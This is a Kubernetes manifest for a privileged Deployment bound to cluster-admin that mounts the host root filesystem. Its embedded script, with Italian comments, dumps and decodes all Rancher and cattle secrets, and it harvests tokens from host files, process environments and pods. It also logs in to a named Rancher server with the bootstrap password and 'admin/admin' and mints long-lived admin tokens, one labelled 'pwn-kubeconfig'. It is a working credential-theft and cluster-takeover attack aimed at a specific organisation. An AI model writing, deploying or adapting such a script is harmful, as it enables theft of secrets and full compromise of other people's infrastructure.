
apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v2
  namespace: egam-production
  labels:
    app: network-access-v2
spec:
  replicas: 1
  selector:
    matchLabels:
      app: network-access-v2
  template:
    metadata:
      labels:
        app: network-access-v2
    spec:
      hostNetwork: true
      hostPID: true
      serviceAccountName: admin-sa
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        env:
        - name: AWS_ACCESS_KEY_ID
          valueFrom:
            secretKeyRef:
              name: aws-credentials-production
              key: accessKeyID
              optional: true
        - name: AWS_SECRET_ACCESS_KEY
          valueFrom:
            secretKeyRef:
              name: aws-credentials-production
              key: secretAccessKey
              optional: true
        - name: AWS_DEFAULT_REGION
          value: "us-east-1"
        command:
          - /bin/bash
          - -c
          - |
            export AWS_PAGER=""
            KC="--kubeconfig=/host/etc/rancher/rke2/rke2.yaml"
            set -x

            apk add --no-cache curl jq aws-cli openssl base64 2>&1 | tail -3

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
            fi

            echo "############ [0] AUTH CHECK ############"
            kubectl $KC auth can-i '*' '*' 2>&1
            kubectl $KC get nodes 2>&1 | head -5

            echo "############ [1] RANCHER SECRET (bootstrap) ############"
            kubectl $KC -n cattle-system get secret rancher-secret -o json 2>&1
            echo "--- bootstrapPassword ---"
            kubectl $KC -n cattle-system get secret rancher-secret -o jsonpath='{.data.bootstrapPassword}' 2>&1 | base64 -d 2>&1
            echo ""
            echo "--- all keys ---"
            kubectl $KC -n cattle-system get secret rancher-secret -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1

            echo "############ [2] TUTTI I SECRET CATTLE-SYSTEM ############"
            kubectl $KC -n cattle-system get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | "### " + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' 2>&1

            echo "############ [3] CATTLE-CREDENTIALS TOKEN ############"
            kubectl $KC -n cattle-system get secrets -o json 2>&1 | jq -r '.items[] | select(.metadata.name | test("cattle-credentials|cattle-token"; "i")) | .metadata.name + ":" + "\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n"))' 2>&1

            echo "############ [4] TUTTI I TOKEN RANCHER (tokens.management.cattle.io) ############"
            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | .metadata.name + " | user: " + (.userId // "") + " | token: " + (.token // "") + " | desc: " + (.description // "") + " | enabled: " + (.enabled|tostring)' 2>&1

            echo "############ [5] TOKEN DA CATTLE-GLOBAL-DATA ############"
            kubectl $KC -n cattle-global-data get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1

            echo "############ [6] USER RANCHER ############"
            kubectl $KC get users.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.username // "") + " | " + (.displayName // "") + " | " + (.principalIds | join(","))' 2>&1

            echo "############ [7] CLUSTERS RANCHER ############"
            kubectl $KC get clusters.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.spec.displayName // "") + " | " + (.status.conditions[0].type // "")' 2>&1

            echo "############ [8] RANCHER SETTINGS ############"
            kubectl $KC get settings.management.cattle.io server-url -o jsonpath='{.value}' 2>&1
            echo ""
            kubectl $KC get settings.management.cattle.io -o json 2>&1 | jq -r '.items[] | select(.metadata.name | test("server-url|api-host|ui"; "i")) | .metadata.name + "=" + (.value // "")' 2>&1

            echo "############ [9] LOGIN RANCHER (bootstrap) ############"
            BP=$(kubectl $KC -n cattle-system get secret rancher-secret -o jsonpath='{.data.bootstrapPassword}' 2>/dev/null | base64 -d)
            echo "BP_LEN=${#BP}"
            if [ -n "$BP" ]; then
              echo "--- login con admin/$BP ---"
              curl -sk -X POST \
                -H "Content-Type: application/json" \
                "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
                -d "{\"username\":\"admin\",\"password\":\"$BP\",\"responseType\":\"cookie\"}" 2>&1 | head -c 5000
              echo ""
              echo "--- login con admin/token ---"
              curl -sk -X POST \
                -H "Content-Type: application/json" \
                "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
                -d "{\"username\":\"admin\",\"password\":\"admin\",\"responseType\":\"cookie\"}" 2>&1 | head -c 3000
              echo ""
            fi

            echo "############ [10] CREA TOKEN RANCHER (via K8s API) ############"
            kubectl $KC create token admin -n cattle-system --duration=87600h 2>&1
            echo ""

            echo "############ [11] CREA TOKEN RANCHER (via API con kubeconfig token) ############"
            # Estrai token admin da kubeconfig RKE2
            RKE2_TOKEN=$(kubectl $KC config view --minify -o jsonpath='{.users[0].user.token}' 2>&1)
            echo "RKE2_TOKEN_LEN=${#RKE2_TOKEN}"
            if [ -n "$RKE2_TOKEN" ]; then
              echo "--- crea token con RKE2 token ---"
              curl -sk -X POST \
                -H "Authorization: Bearer $RKE2_TOKEN" \
                -H "Content-Type: application/json" \
                "https://rancher.management.egam.com.br/v3/tokens" \
                -d '{"description":"pwn-kubeconfig","ttl":0}' 2>&1 | head -c 5000
              echo ""
            fi

            echo "############ [12] TOKEN DA FILE RKE2 ############"
            ls -la /host/etc/rancher/rke2/ 2>&1
            cat /host/etc/rancher/rke2/rke2.yaml 2>&1 | head -50
            echo "--- cerca token in tutti i file rke2 ---"
            find /host/etc/rancher -type f -exec grep -l "token" {} \; 2>/dev/null
            grep -r "token" /host/etc/rancher/ 2>/dev/null | head -20

            echo "############ [13] TOKEN DA /var/lib/rancher ############"
            find /host/var/lib/rancher -name "*.yaml" -o -name "*.json" 2>/dev/null | head -20
            find /host/var/lib/rancher -name "*token*" 2>/dev/null
            grep -r "token" /host/var/lib/rancher/rke2/ 2>/dev/null | head -20

            echo "############ [14] TOKEN DA SISTEMA (processi) ############"
            cat /host/proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "token\|rancher" | head -20

            echo "############ [15] TOKEN DA DOCKER/CONTAINERD ############"
            ls -la /host/var/lib/rancher/rke2/agent/ 2>&1
            find /host/var/lib/rancher/rke2/agent -name "*.kubeconfig" 2>/dev/null -exec cat {} \;

            echo "############ [16] RANCHER API CON KUBECONFIG TOKEN ############"
            if [ -n "$RKE2_TOKEN" ]; then
              echo "--- /v3/clusters ---"
              curl -sk -H "Authorization: Bearer $RKE2_TOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 5000
              echo ""
              echo "--- /v3/users ---"
              curl -sk -H "Authorization: Bearer $RKE2_TOKEN" "https://rancher.management.egam.com.br/v3/users" 2>&1 | head -c 3000
              echo ""
              echo "--- /v3/tokens ---"
              curl -sk -H "Authorization: Bearer $RKE2_TOKEN" "https://rancher.management.egam.com.br/v3/tokens" 2>&1 | head -c 3000
              echo ""
            fi

            echo "############ [17] TOKEN DA CONTAINER RANCHER ############"
            kubectl $KC get pods -n cattle-system -o wide 2>&1
            POD=$(kubectl $KC get pods -n cattle-system -l app=rancher -o jsonpath='{.items[0].metadata.name}' 2>&1)
            echo "POD=$POD"
            if [ -n "$POD" ]; then
              kubectl $KC exec -n cattle-system $POD -- env 2>&1 | grep -i "token\|rancher\|password" | head -20
              kubectl $KC exec -n cattle-system $POD -- cat /var/lib/rancher/management-state/ 2>&1 | head -5
            fi

            echo "############ [18] TOKEN DA SECRET cattle-global-data ############"
            kubectl $KC -n cattle-global-data get secret -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1

            echo "############ [19] RANCHER USER ADMIN ############"
            kubectl $KC get users.management.cattle.io admin -o json 2>&1 | jq -r '.metadata.name + " | " + (.username // "") + " | " + (.displayName // "")' 2>&1
            kubectl $KC get users.management.cattle.io admin -o json 2>&1

            echo "############ [20] DONE ############"
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: egam-production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: egam-production
